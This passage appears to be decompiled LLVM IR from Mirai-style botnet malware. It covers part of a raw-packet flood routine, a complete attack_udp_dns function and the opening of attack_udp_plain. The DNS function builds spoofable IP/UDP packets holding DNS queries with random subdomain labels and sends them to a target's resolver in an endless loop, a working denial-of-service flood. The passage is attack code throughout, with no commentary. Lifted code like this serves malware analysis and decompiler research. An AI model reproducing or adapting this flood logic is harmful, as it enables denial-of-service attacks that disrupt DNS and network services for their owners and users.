dec_label_pc_11868:                               ; preds = %dec_label_pc_11a9c, %dec_label_pc_11868.preheader
  br label %dec_label_pc_11a9c

dec_label_pc_11874:                               ; preds = %dec_label_pc_11a9c
  %v3_11878 = mul i32 %v3_118cc, 4
  %v2_11884 = add i32 %v3_11878, %v3_114e0
  %v1_11888 = inttoptr i32 %v2_11884 to i32*
  %v2_11888 = load i32, i32* %v1_11888, align 4
  %v1_1189c = add i32 %v2_11888, 20
  %v2_118b0 = mul i32 %v3_118cc, 24
  %v2_118bc = add i32 %v2_118b0, %targs
  %v1_118c0 = add i32 %v2_118bc, 20
  %v2_118c0 = inttoptr i32 %v1_118c0 to i8*
  %v3_118c0 = load i8, i8* %v2_118c0, align 1
  %tmp = icmp ugt i8 %v3_118c0, 31
  br i1 %tmp, label %dec_label_pc_1193c, label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_11874
  %v1_118e8 = add i32 %v2_118bc, 16
  %v2_118e8 = inttoptr i32 %v1_118e8 to i32*
  %v3_118e8 = load i32, i32* %v2_118e8, align 4
  %v1_118f0 = call i32 @__GI_ntohl(i32 %v3_118e8)
  store i32 %v1_118f0, i32* @r4, align 4
  %v0_118f8 = call i32 @rand_next()
  %v3_11900 = load i32, i32* %fd_-76, align 4
  %v2_1190c = mul i32 %v3_11900, 24
  %v2_11918 = add i32 %v2_1190c, %targs
  %v1_1191c = add i32 %v2_11918, 20
  %v2_1191c = inttoptr i32 %v1_1191c to i8*
  %v3_1191c = load i8, i8* %v2_1191c, align 1
  %v4_1191c = zext i8 %v3_1191c to i32
  %v6_11920 = lshr i32 %v0_118f8, %v4_1191c
  %v0_11924 = load i32, i32* @r4, align 4
  %v2_11924 = add i32 %v0_11924, %v6_11920
  %v1_1192c = call i32 @__GI_htonl(i32 %v2_11924)
  %v2_11938 = add i32 %v2_11888, 16
  %v3_11938 = inttoptr i32 %v2_11938 to i32*
  store i32 %v1_1192c, i32* %v3_11938, align 4
  br label %dec_label_pc_1193c

dec_label_pc_1193c:                               ; preds = %dec_label_pc_11874, %dec_label_pc_118cc
  br i1 %v3_11948, label %dec_label_pc_11950, label %dec_label_pc_11968

dec_label_pc_11950:                               ; preds = %dec_label_pc_1193c
  %v0_11950 = call i32 @rand_next()
  %v1_11964 = trunc i32 %v0_11950 to i16
  %v3_11964 = add i32 %v2_11888, 4
  %v4_11964 = inttoptr i32 %v3_11964 to i16*
  store i16 %v1_11964, i16* %v4_11964, align 2
  br label %dec_label_pc_11968

dec_label_pc_11968:                               ; preds = %dec_label_pc_1193c, %dec_label_pc_11950
  br i1 %v3_11974, label %dec_label_pc_1197c, label %dec_label_pc_11994

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11968
  %v0_1197c = call i32 @rand_next()
  %v1_11990 = trunc i32 %v0_1197c to i16
  %v3_11990 = inttoptr i32 %v1_1189c to i16*
  store i16 %v1_11990, i16* %v3_11990, align 2
  br label %dec_label_pc_11994

dec_label_pc_11994:                               ; preds = %dec_label_pc_11968, %dec_label_pc_1197c
  br i1 %v3_119a0, label %dec_label_pc_119a8, label %dec_label_pc_11994.dec_label_pc_119c0_crit_edge

dec_label_pc_11994.dec_label_pc_119c0_crit_edge:  ; preds = %dec_label_pc_11994
  %.pre = add i32 %v2_11888, 22
  %.pre20 = inttoptr i32 %.pre to i16*
  br label %dec_label_pc_119c0

dec_label_pc_119a8:                               ; preds = %dec_label_pc_11994
  %v0_119a8 = call i32 @rand_next()
  %v1_119bc = trunc i32 %v0_119a8 to i16
  %v3_119bc = add i32 %v2_11888, 22
  %v4_119bc = inttoptr i32 %v3_119bc to i16*
  store i16 %v1_119bc, i16* %v4_119bc, align 2
  br label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %dec_label_pc_11994.dec_label_pc_119c0_crit_edge, %dec_label_pc_119a8
  %v2_11a44.pre-phi = phi i16* [ %.pre20, %dec_label_pc_11994.dec_label_pc_119c0_crit_edge ], [ %v4_119bc, %dec_label_pc_119a8 ]
  %v3_119c8 = add i32 %v2_11888, 10
  %v4_119c8 = inttoptr i32 %v3_119c8 to i16*
  store i16 0, i16* %v4_119c8, align 2
  %v1_119d0 = inttoptr i32 %v2_11888 to i16*
  %v5_119d8 = call i16 @checksum_generic(i16* %v1_119d0, i32 20)
  store i16 %v5_119d8, i16* %v4_119c8, align 2
  %v3_119f4 = add i32 %v2_11888, 26
  %v4_119f4 = inttoptr i32 %v3_119f4 to i16*
  store i16 0, i16* %v4_119f4, align 2
  %v1_119fc = add i32 %v2_11888, 24
  %v2_119fc = inttoptr i32 %v1_119fc to i16*
  %v3_119fc = load i16, i16* %v2_119fc, align 2
  %v3_11a00 = load i32, i32* %i_-80, align 4
  %v1_11a04 = add i32 %v3_11a00, 12
  %v4_11a0c = inttoptr i32 %v1_1189c to i8*
  %v8_11a10 = call i16 @checksum_tcpudp(i32 %v2_11888, i8* %v4_11a0c, i16 %v3_119fc, i32 %v1_11a04)
  store i16 %v8_11a10, i16* %v4_119f4, align 2
  %v3_11a24 = load i32, i32* %fd_-76, align 4
  %v2_11a30 = mul i32 %v3_11a24, 24
  %v2_11a3c = add i32 %v2_11a30, %targs
  %v3_11a44 = load i16, i16* %v2_11a44.pre-phi, align 2
  %v3_11a48 = add i32 %v2_11a3c, 2
  %v4_11a48 = inttoptr i32 %v3_11a48 to i16*
  store i16 %v3_11a44, i16* %v4_11a48, align 2
  %v3_11a4c = load i32, i32* %i_-80, align 4
  %v1_11a50 = add i32 %v3_11a4c, 32
  %v3_11a54 = load i32, i32* %fd_-76, align 4
  %v2_11a60 = mul i32 %v3_11a54, 24
  %v2_11a6c = add i32 %v2_11a60, %targs
  %v6_11a8c = call i32 @__libc_sendto(i32 %v3_115e4, i32 %v2_11888, i32 %v1_11a50, i32 16384, i32 %v2_11a6c, i32 16)
  %v3_11a90 = load i32, i32* %fd_-76, align 4
  %v1_11a94 = add i32 %v3_11a90, 1
  br label %dec_label_pc_11a9c

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11868, %dec_label_pc_119c0
  %v3_118cc = phi i32 [ 0, %dec_label_pc_11868 ], [ %v1_11a94, %dec_label_pc_119c0 ]
  store i32 %v3_118cc, i32* %fd_-76, align 4
  %sext7 = mul i32 %v3_118cc, 16777216
  %v9_11aa8 = sdiv i32 %sext7, 16777216
  %v10_11aa8 = icmp sgt i32 %tmp24, %v9_11aa8
  br i1 %v10_11aa8, label %dec_label_pc_11874, label %dec_label_pc_11868

dec_label_pc_11ab0:                               ; preds = %entry, %dec_label_pc_11630
  ret void

; uselistorder directives
  uselistorder i32 %v3_118cc, { 0, 3, 1, 2 }
  uselistorder i32 %v2_11888, { 5, 6, 2, 3, 7, 8, 1, 0, 9, 4, 10 }
  uselistorder i32 %v3_11648, { 0, 2, 1 }
  uselistorder i32 %v5_117b8, { 1, 0 }
  uselistorder i32 %v3_115e4, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %i_-80, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %fd_-76, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 10, 9 }
  uselistorder i8 %opts_len, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11ab0, { 1, 0 }
  uselistorder label %dec_label_pc_11a9c, { 1, 0 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
  uselistorder label %dec_label_pc_11994, { 1, 0 }
  uselistorder label %dec_label_pc_11968, { 1, 0 }
  uselistorder label %dec_label_pc_1193c, { 1, 0 }
  uselistorder label %dec_label_pc_11858, { 1, 0 }
  uselistorder label %dec_label_pc_11774, { 1, 0 }
}

define void @attack_udp_dns(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp36 = sext i8 %targs_len to i32
  %fd_-116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 72396, i32* %stack_var_-4, align 4
  %v2_11ac8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11ac8, i32* @fp, align 4
  %v3_11af4 = call i32 @calloc(i32 %tmp36, i32 4)
  %v9_11b14 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_11b1c = trunc i32 %v9_11b14 to i8
  %v9_11b38 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext3 = mul i32 %v9_11b38, 65536
  %v1_11b3c = sdiv i32 %sext3, 65536
  %v1_11b40 = trunc i32 %v1_11b3c to i16
  %v9_11b58 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_11b60 = trunc i32 %v9_11b58 to i8
  %v9_11b78 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 0)
  %sext5 = mul i32 %v9_11b78, 16777216
  %v1_11b7c = sdiv i32 %sext5, 16777216
  %v1_11b80 = trunc i32 %v1_11b7c to i8
  %v9_11b9c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %sext6 = mul i32 %v9_11b9c, 65536
  %v1_11ba0 = sdiv i32 %sext6, 65536
  %v1_11ba4 = trunc i32 %v1_11ba0 to i16
  %v9_11bbc = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 53)
  %sext7 = mul i32 %v9_11bbc, 65536
  %v1_11bc0 = sdiv i32 %sext7, 65536
  %v1_11bc4 = trunc i32 %v1_11bc0 to i16
  %v9_11be0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 9, i32 65535)
  %v9_11c00 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 12)
  %sext8 = mul i32 %v9_11c00, 16777216
  %v1_11c04 = sdiv i32 %sext8, 16777216
  %v1_11c08 = trunc i32 %v1_11c04 to i8
  %v11_11c20 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 8, i8* null)
  %v13_11c20 = ptrtoint i8* %v11_11c20 to i32
  %v1_11c2c = call i32 @get_dns_resolver()
  %v2_11c3c = icmp eq i8* %v11_11c20, null
  br i1 %v2_11c3c, label %dec_label_pc_12298, label %dec_label_pc_11c44

dec_label_pc_11c44:                               ; preds = %entry
  %v3_11c48 = call i32 @util_strlen(i8* nonnull %v11_11c20)
  %v3_11c60 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_11c70 = icmp eq i32 %v3_11c60, -1
  br i1 %v7_11c70, label %dec_label_pc_12298, label %dec_label_pc_11c78

dec_label_pc_11c78:                               ; preds = %dec_label_pc_11c44
  store i32 1, i32* %fd_-116, align 4
  %v2_11c80 = ptrtoint i32* %fd_-116 to i32
  store i32 0, i32* @r1, align 4
  %v5_11c9c = call i32 @__GI_setsockopt(i32 %v3_11c60, i32 0, i32 3, i32 %v2_11c80, i32 4)
  %v3_11ca4 = icmp eq i32 %v5_11c9c, -1
  br i1 %v3_11ca4, label %dec_label_pc_11cac, label %dec_label_pc_12048.preheader

dec_label_pc_12048.preheader:                     ; preds = %dec_label_pc_11c78
  %v4_11d90 = urem i32 %v1_11c04, 256
  %v4_11dd0 = urem i32 %v1_11b3c, 65536
  %v2_11dfc = icmp eq i8 %v1_11b80, 0
  %v4_11e44 = urem i32 %v1_11ba0, 65536
  %v4_11e60 = urem i32 %v1_11bc0, 65536
  %fold17 = add i32 %v3_11c48, %v4_11d90
  %fold18 = add i32 %fold17, 27
  %v3_11ea0 = urem i32 %fold18, 65536
  %v5_11ebc = urem i32 %v9_11be0, 65536
  %v1_11f18 = add nuw nsw i32 %v4_11d90, 41
  %v1_11f48 = add i32 %v3_11c48, 1
  %fold11 = add i32 %fold17, 47
  %v3_11db4 = urem i32 %fold11, 65536
  %v5_11fe486 = icmp sgt i32 %v3_11c48, 0
  br label %dec_label_pc_12048

dec_label_pc_11cac:                               ; preds = %dec_label_pc_11c78
  %v1_11cb0 = call i32 @__GI___libc_close(i32 %v3_11c60)
  br label %dec_label_pc_12298

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_12048
  %v3_11cd8 = mul i32 %v3_11cd4, 4
  %v2_11ce4 = add i32 %v3_11cd8, %v3_11af4
  store i32 %v2_11ce4, i32* @r4, align 4
  %v2_11cf0 = call i32 @calloc(i32 600, i32 1)
  %v1_11cf8 = load i32, i32* @r4, align 4
  %v2_11cf8 = inttoptr i32 %v1_11cf8 to i32*
  store i32 %v2_11cf0, i32* %v2_11cf8, align 4
  %v3_11cfc = load i32, i32* %fd_-116, align 4
  %v3_11d00 = mul i32 %v3_11cfc, 4
  %v2_11d0c = add i32 %v3_11d00, %v3_11af4
  %v1_11d10 = inttoptr i32 %v2_11d0c to i32*
  %v2_11d10 = load i32, i32* %v1_11d10, align 4
  %v5_11d14 = inttoptr i32 %v2_11d10 to i8*
  %v1_11d1c = add i32 %v2_11d10, 20
  %v5_11d20 = inttoptr i32 %v1_11d1c to i16*
  %v1_11d28 = add i32 %v2_11d10, 28
  %v1_11d34 = add i32 %v2_11d10, 40
  %v4_11d38 = inttoptr i32 %v1_11d34 to i8*
  store i8 69, i8* %v5_11d14, align 1
  %v3_11d8c = add i32 %v2_11d10, 1
  %v4_11d8c = inttoptr i32 %v3_11d8c to i8*
  store i8 %v1_11b1c, i8* %v4_11d8c, align 1
  %v1_11dbc = call i32 @__GI_htons(i32 %v3_11db4)
  %sext12 = mul i32 %v1_11dbc, 65536
  %v1_11dc0 = sdiv i32 %sext12, 65536
  %v1_11dcc = trunc i32 %v1_11dc0 to i16
  %v3_11dcc = add i32 %v2_11d10, 2
  %v4_11dcc = inttoptr i32 %v3_11dcc to i16*
  store i16 %v1_11dcc, i16* %v4_11dcc, align 2
  %v1_11dd8 = call i32 @__GI_htons(i32 %v4_11dd0)
  %v1_11de8 = trunc i32 %v1_11dd8 to i16
  %v3_11de8 = add i32 %v2_11d10, 4
  %v4_11de8 = inttoptr i32 %v3_11de8 to i16*
  store i16 %v1_11de8, i16* %v4_11de8, align 2
  %v3_11df4 = add i32 %v2_11d10, 8
  %v4_11df4 = inttoptr i32 %v3_11df4 to i8*
  store i8 %v1_11b60, i8* %v4_11df4, align 1
  br i1 %v2_11dfc, label %dec_label_pc_11e1c, label %dec_label_pc_11e04

dec_label_pc_11e04:                               ; preds = %dec_label_pc_11cc4
  %v1_11e08 = call i32 @__GI_htons(i32 16384)
  %sext14 = mul i32 %v1_11e08, 65536
  %v1_11e0c = sdiv i32 %sext14, 65536
  %v1_11e18 = trunc i32 %v1_11e0c to i16
  %v3_11e18 = add i32 %v2_11d10, 6
  %v4_11e18 = inttoptr i32 %v3_11e18 to i16*
  store i16 %v1_11e18, i16* %v4_11e18, align 2
  br label %dec_label_pc_11e1c

dec_label_pc_11e1c:                               ; preds = %dec_label_pc_11cc4, %dec_label_pc_11e04
  %v3_11e24 = add i32 %v2_11d10, 9
  %v4_11e24 = inttoptr i32 %v3_11e24 to i8*
  store i8 17, i8* %v4_11e24, align 1
  %v2_11e2c = load i32, i32* @LOCAL_ADDR, align 4
  %v2_11e34 = add i32 %v2_11d10, 12
  %v3_11e34 = inttoptr i32 %v2_11e34 to i32*
  store i32 %v2_11e2c, i32* %v3_11e34, align 4
  %v2_11e40 = add i32 %v2_11d10, 16
  %v3_11e40 = inttoptr i32 %v2_11e40 to i32*
  store i32 %v1_11c2c, i32* %v3_11e40, align 4
  %v1_11e4c = call i32 @__GI_htons(i32 %v4_11e44)
  %sext15 = mul i32 %v1_11e4c, 65536
  %v1_11e50 = sdiv i32 %sext15, 65536
  %v1_11e5c = trunc i32 %v1_11e50 to i16
  store i16 %v1_11e5c, i16* %v5_11d20, align 2
  %v1_11e68 = call i32 @__GI_htons(i32 %v4_11e60)
  %v1_11e78 = trunc i32 %v1_11e68 to i16
  %v3_11e78 = add i32 %v2_11d10, 22
  %v4_11e78 = inttoptr i32 %v3_11e78 to i16*
  store i16 %v1_11e78, i16* %v4_11e78, align 2
  %v1_11ea8 = call i32 @__GI_htons(i32 %v3_11ea0)
  %sext19 = mul i32 %v1_11ea8, 65536
  %v1_11eac = sdiv i32 %sext19, 65536
  %v1_11eb8 = trunc i32 %v1_11eac to i16
  %v3_11eb8 = add i32 %v2_11d10, 24
  %v4_11eb8 = inttoptr i32 %v3_11eb8 to i16*
  store i16 %v1_11eb8, i16* %v4_11eb8, align 2
  %v1_11ec4 = call i32 @__GI_htons(i32 %v5_11ebc)
  %sext20 = mul i32 %v1_11ec4, 65536
  %v1_11ec8 = sdiv i32 %sext20, 65536
  %v1_11ed4 = trunc i32 %v1_11ec8 to i16
  %v3_11ed4 = inttoptr i32 %v1_11d28 to i16*
  store i16 %v1_11ed4, i16* %v3_11ed4, align 2
  %v1_11edc = call i32 @__GI_htons(i32 256)
  %sext21 = mul i32 %v1_11edc, 65536
  %v1_11ee0 = sdiv i32 %sext21, 65536
  %v1_11eec = trunc i32 %v1_11ee0 to i16
  %v3_11eec = add i32 %v2_11d10, 30
  %v4_11eec = inttoptr i32 %v3_11eec to i16*
  store i16 %v1_11eec, i16* %v4_11eec, align 2
  %v1_11ef4 = call i32 @__GI_htons(i32 1)
  %v1_11f04 = trunc i32 %v1_11ef4 to i16
  %v3_11f04 = add i32 %v2_11d10, 32
  %v4_11f04 = inttoptr i32 %v3_11f04 to i16*
  store i16 %v1_11f04, i16* %v4_11f04, align 2
  store i8 %v1_11c08, i8* %v4_11d38, align 1
  %v2_11f2c = add i32 %v1_11f18, %v2_11d10
  %v1_11f40 = add i32 %v2_11f2c, 1
  %v1_11f4c = inttoptr i32 %v1_11f40 to i8*
  call void @util_memcpy(i8* %v1_11f4c, i8* nonnull %v11_11c20, i32 %v1_11f48)
  br i1 %v5_11fe486, label %dec_label_pc_11f68, label %dec_label_pc_11fe8

dec_label_pc_11f68:                               ; preds = %dec_label_pc_11e1c, %dec_label_pc_11fcc
  %storemerge2989 = phi i32 [ %v1_11fd0, %dec_label_pc_11fcc ], [ 0, %dec_label_pc_11e1c ]
  %dnst_-52.188 = phi i32 [ %dnst_-52.0, %dec_label_pc_11fcc ], [ %v2_11f2c, %dec_label_pc_11e1c ]
  %curr_word_len_-70.187 = phi i8 [ %curr_word_len_-70.0, %dec_label_pc_11fcc ], [ 0, %dec_label_pc_11e1c ]
  %v2_11f74 = add i32 %storemerge2989, %v13_11c20
  %v1_11f78 = inttoptr i32 %v2_11f74 to i8*
  %v2_11f78 = load i8, i8* %v1_11f78, align 1
  %v7_11f7c = icmp eq i8 %v2_11f78, 46
  br i1 %v7_11f7c, label %dec_label_pc_11f84, label %dec_label_pc_11fc0

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f68
  %v3_11f8c = inttoptr i32 %dnst_-52.188 to i8*
  store i8 %curr_word_len_-70.187, i8* %v3_11f8c, align 1
  %v1_11fb4 = add i32 %storemerge2989, %v1_11f40
  br label %dec_label_pc_11fcc

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11f68
  %v1_11fc4 = add i8 %curr_word_len_-70.187, 1
  br label %dec_label_pc_11fcc

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11f84, %dec_label_pc_11fc0
  %curr_word_len_-70.0 = phi i8 [ 0, %dec_label_pc_11f84 ], [ %v1_11fc4, %dec_label_pc_11fc0 ]
  %dnst_-52.0 = phi i32 [ %v1_11fb4, %dec_label_pc_11f84 ], [ %dnst_-52.188, %dec_label_pc_11fc0 ]
  %v1_11fd0 = add nuw nsw i32 %storemerge2989, 1
  %v5_11fe4 = icmp slt i32 %v1_11fd0, %v3_11c48
  br i1 %v5_11fe4, label %dec_label_pc_11f68, label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %dec_label_pc_11fcc, %dec_label_pc_11e1c
  %curr_word_len_-70.1.lcssa = phi i8 [ 0, %dec_label_pc_11e1c ], [ %curr_word_len_-70.0, %dec_label_pc_11fcc ]
  %dnst_-52.1.lcssa = phi i32 [ %v2_11f2c, %dec_label_pc_11e1c ], [ %dnst_-52.0, %dec_label_pc_11fcc ]
  %v3_11ff0 = inttoptr i32 %dnst_-52.1.lcssa to i8*
  store i8 %curr_word_len_-70.1.lcssa, i8* %v3_11ff0, align 1
  %v2_12000 = add i32 %v2_11f2c, %v3_11c48
  %v1_12004 = add i32 %v2_12000, 2
  %v1_12010 = call i32 @__GI_htons(i32 1)
  %sext23 = mul i32 %v1_12010, 65536
  %v1_12014 = sdiv i32 %sext23, 65536
  %v1_12020 = trunc i32 %v1_12014 to i16
  %v3_12020 = inttoptr i32 %v1_12004 to i16*
  store i16 %v1_12020, i16* %v3_12020, align 2
  %v1_12028 = call i32 @__GI_htons(i32 1)
  %sext24 = mul i32 %v1_12028, 65536
  %v1_1202c = sdiv i32 %sext24, 65536
  %v1_12038 = trunc i32 %v1_1202c to i16
  %v3_12038 = add i32 %v2_12000, 4
  %v4_12038 = inttoptr i32 %v3_12038 to i16*
  store i16 %v1_12038, i16* %v4_12038, align 2
  %v3_1203c = load i32, i32* %fd_-116, align 4
  %v1_12040 = add i32 %v3_1203c, 1
  br label %dec_label_pc_12048

dec_label_pc_12048:                               ; preds = %dec_label_pc_12048.preheader, %dec_label_pc_11fe8
  %v3_11cd4 = phi i32 [ %v1_12040, %dec_label_pc_11fe8 ], [ 0, %dec_label_pc_12048.preheader ]
  store i32 %v3_11cd4, i32* %fd_-116, align 4
  %sext9 = mul i32 %v3_11cd4, 16777216
  %v9_12054 = sdiv i32 %sext9, 16777216
  %v10_12054 = icmp sgt i32 %tmp36, %v9_12054
  br i1 %v10_12054, label %dec_label_pc_11cc4, label %dec_label_pc_12058.preheader

dec_label_pc_12058.preheader:                     ; preds = %dec_label_pc_12048
  %v3_120b8 = icmp eq i16 %v1_11b40, -1
  %v3_120e4 = icmp eq i16 %v1_11ba4, -1
  %v3_12110 = icmp eq i16 %v1_11bc4, -1
  %v3_1213c = icmp eq i32 %v5_11ebc, 65535
  %v2_121f8 = add i32 %targs, 4
  br label %dec_label_pc_12058

dec_label_pc_12058:                               ; preds = %dec_label_pc_12284, %dec_label_pc_12058.preheader
  br label %dec_label_pc_12284

dec_label_pc_12064:                               ; preds = %dec_label_pc_12284
  %v3_12068 = mul i32 %v3_12064, 4
  %v2_12074 = add i32 %v3_12068, %v3_11af4
  %v1_12078 = inttoptr i32 %v2_12074 to i32*
  %v2_12078 = load i32, i32* %v1_12078, align 4
  %v1_1208c = add i32 %v2_12078, 20
  %v1_12098 = add i32 %v2_12078, 28
  %v1_120a4 = add i32 %v2_12078, 41
  %v4_120a8 = inttoptr i32 %v1_120a4 to i8*
  br i1 %v3_120b8, label %dec_label_pc_120c0, label %dec_label_pc_120d8

dec_label_pc_120c0:                               ; preds = %dec_label_pc_12064
  %v0_120c0 = call i32 @rand_next()
  %v1_120d4 = trunc i32 %v0_120c0 to i16
  %v3_120d4 = add i32 %v2_12078, 4
  %v4_120d4 = inttoptr i32 %v3_120d4 to i16*
  store i16 %v1_120d4, i16* %v4_120d4, align 2
  br label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_12064, %dec_label_pc_120c0
  br i1 %v3_120e4, label %dec_label_pc_120ec, label %dec_label_pc_12104

dec_label_pc_120ec:                               ; preds = %dec_label_pc_120d8
  %v0_120ec = call i32 @rand_next()
  %v1_12100 = trunc i32 %v0_120ec to i16
  %v3_12100 = inttoptr i32 %v1_1208c to i16*
  store i16 %v1_12100, i16* %v3_12100, align 2
  br label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120d8, %dec_label_pc_120ec
  br i1 %v3_12110, label %dec_label_pc_12118, label %dec_label_pc_12130

dec_label_pc_12118:                               ; preds = %dec_label_pc_12104
  %v0_12118 = call i32 @rand_next()
  %v1_1212c = trunc i32 %v0_12118 to i16
  %v3_1212c = add i32 %v2_12078, 22
  %v4_1212c = inttoptr i32 %v3_1212c to i16*
  store i16 %v1_1212c, i16* %v4_1212c, align 2
  br label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %dec_label_pc_12104, %dec_label_pc_12118
  br i1 %v3_1213c, label %dec_label_pc_12144, label %dec_label_pc_1215c

dec_label_pc_12144:                               ; preds = %dec_label_pc_12130
  %v0_12144 = call i32 @rand_next()
  %v1_12158 = trunc i32 %v0_12144 to i16
  %v3_12158 = inttoptr i32 %v1_12098 to i16*
  store i16 %v1_12158, i16* %v3_12158, align 2
  br label %dec_label_pc_1215c

dec_label_pc_1215c:                               ; preds = %dec_label_pc_12130, %dec_label_pc_12144
  call void @rand_alphastr(i8* %v4_120a8, i32 %v4_11d90)
  %v3_12178 = add i32 %v2_12078, 10
  %v4_12178 = inttoptr i32 %v3_12178 to i16*
  store i16 0, i16* %v4_12178, align 2
  %v1_12180 = inttoptr i32 %v2_12078 to i16*
  %v5_12188 = call i16 @checksum_generic(i16* %v1_12180, i32 20)
  store i16 %v5_12188, i16* %v4_12178, align 2
  %v3_121a4 = add i32 %v2_12078, 26
  %v4_121a4 = inttoptr i32 %v3_121a4 to i16*
  store i16 0, i16* %v4_121a4, align 2
  %v1_121ac = add i32 %v2_12078, 24
  %v2_121ac = inttoptr i32 %v1_121ac to i16*
  %v3_121ac = load i16, i16* %v2_121ac, align 2
  %v4_121c4 = inttoptr i32 %v1_1208c to i8*
  %v8_121cc = call i16 @checksum_tcpudp(i32 %v2_12078, i8* %v4_121c4, i16 %v3_121ac, i32 %fold18)
  store i16 %v8_121cc, i16* %v4_121a4, align 2
  %v3_121e0 = load i32, i32* %fd_-116, align 4
  %v2_121ec = mul i32 %v3_121e0, 24
  %v2_12200 = add i32 %v2_121f8, %v2_121ec
  %v3_12200 = inttoptr i32 %v2_12200 to i32*
  store i32 %v1_11c2c, i32* %v3_12200, align 4
  %v3_12204 = load i32, i32* %fd_-116, align 4
  %v2_12210 = mul i32 %v3_12204, 24
  %v2_1221c = add i32 %v2_12210, %targs
  %v1_12224 = add i32 %v2_12078, 22
  %v2_12224 = inttoptr i32 %v1_12224 to i16*
  %v3_12224 = load i16, i16* %v2_12224, align 2
  %v3_12228 = add i32 %v2_1221c, 2
  %v4_12228 = inttoptr i32 %v3_12228 to i16*
  store i16 %v3_12224, i16* %v4_12228, align 2
  %v3_1223c = load i32, i32* %fd_-116, align 4
  %v2_12248 = mul i32 %v3_1223c, 24
  %v2_12254 = add i32 %v2_12248, %targs
  %v6_12274 = call i32 @__libc_sendto(i32 %v3_11c60, i32 %v2_12078, i32 %fold11, i32 16384, i32 %v2_12254, i32 16)
  %v3_12278 = load i32, i32* %fd_-116, align 4
  %v1_1227c = add i32 %v3_12278, 1
  br label %dec_label_pc_12284

dec_label_pc_12284:                               ; preds = %dec_label_pc_12058, %dec_label_pc_1215c
  %v3_12064 = phi i32 [ 0, %dec_label_pc_12058 ], [ %v1_1227c, %dec_label_pc_1215c ]
  store i32 %v3_12064, i32* %fd_-116, align 4
  %sext10 = mul i32 %v3_12064, 16777216
  %v9_12290 = sdiv i32 %sext10, 16777216
  %v10_12290 = icmp sgt i32 %tmp36, %v9_12290
  br i1 %v10_12290, label %dec_label_pc_12064, label %dec_label_pc_12058

dec_label_pc_12298:                               ; preds = %dec_label_pc_11c44, %entry, %dec_label_pc_11cac
  ret void

; uselistorder directives
  uselistorder i32 %v3_12064, { 0, 2, 1 }
  uselistorder i32 %v2_12078, { 4, 1, 5, 2, 3, 6, 7, 0, 8, 9, 10, 11 }
  uselistorder i32 %v3_11cd4, { 0, 2, 1 }
  uselistorder i32 %v1_11fd0, { 1, 0 }
  uselistorder i32 %dnst_-52.188, { 1, 0 }
  uselistorder i32 %storemerge2989, { 0, 2, 1 }
  uselistorder i32 %v2_11f2c, { 2, 0, 1, 3 }
  uselistorder i32 %fold11, { 1, 0 }
  uselistorder i32 %v5_11ebc, { 1, 0 }
  uselistorder i32 %fold18, { 1, 0 }
  uselistorder i32 %v4_11d90, { 1, 0, 2 }
  uselistorder i32 %v3_11c60, { 2, 1, 3, 0 }
  uselistorder i32 %v3_11c48, { 1, 3, 0, 4, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-116, { 1, 2, 3, 4, 5, 0, 6, 7, 9, 8 }
  uselistorder i32 41, { 3, 1, 0, 2, 4, 5, 6 }
  uselistorder i8* (i8, i32, i8, i8*)* @attack_get_opt_str, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12298, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12284, { 1, 0 }
  uselistorder label %dec_label_pc_1215c, { 1, 0 }
  uselistorder label %dec_label_pc_12130, { 1, 0 }
  uselistorder label %dec_label_pc_12104, { 1, 0 }
  uselistorder label %dec_label_pc_120d8, { 1, 0 }
  uselistorder label %dec_label_pc_12048, { 1, 0 }
  uselistorder label %dec_label_pc_11fcc, { 1, 0 }
  uselistorder label %dec_label_pc_11f68, { 1, 0 }
  uselistorder label %dec_label_pc_11e1c, { 1, 0 }
}

define void @attack_udp_plain(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp14 = sext i8 %targs_len to i32
  %bind_addr_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_122ac = load i32, i32* @r4, align 4
  store i32 74420, i32* %stack_var_-4, align 4
  %v2_122b0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_122b0, i32* @fp, align 4
  store i32 %opts, i32* %stack_var_-96, align 4
  %v3_122dc = call i32 @calloc(i32 %tmp14, i32 4)
  %v3_122f4 = call i32 @calloc(i32 %tmp14, i32 4)
